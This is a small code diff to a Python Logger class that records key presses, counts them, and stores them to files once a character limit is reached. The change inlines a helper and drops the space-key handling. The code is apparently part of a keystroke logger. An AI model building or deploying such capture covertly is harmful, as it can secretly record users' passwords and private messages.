@@ -36,15 +36,10 @@ class Logger:
                     os.remove(os.path.join(root, name))
             os.rmdir(self.__dir_name)
 
-    def _rec_key(self, key):
-        self.__prog.update(1)
-        self.__captured.append(key)
-
     def _key_event_press(self, key):
-        if key == Key.space:
-            self._rec_key(" ")
-        elif len(str(key)) == 3:
-            self._rec_key(key)
+        if len(str(key)) == 3:
+            self.__prog.update(1)
+            self.__captured.append(key)
         if len(self.__captured) >= FILE_CHAR_LIM:
             self._store_data()
 
